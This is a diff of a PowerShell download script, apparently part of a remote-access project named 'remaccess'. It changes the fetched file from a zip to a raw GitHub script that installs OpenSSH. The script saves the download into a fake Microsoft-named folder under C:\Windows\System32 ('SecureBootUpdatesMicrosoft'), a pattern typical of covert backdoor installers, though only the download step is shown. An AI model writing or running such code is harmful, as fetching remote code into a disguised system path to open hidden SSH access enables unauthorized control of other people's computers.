@@ -1,5 +1,5 @@
 #SSH DL
-$downloadUrl = "https://github.com/DirNotAvailable/remaccess/releases/download/CorePrograms/InletValve.zip"
+$downloadUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/OpenSSHInstallFromExe.ps1"
 $downloadedFileName = [System.IO.Path]::GetFileName($downloadUrl)
 $programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
 $destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
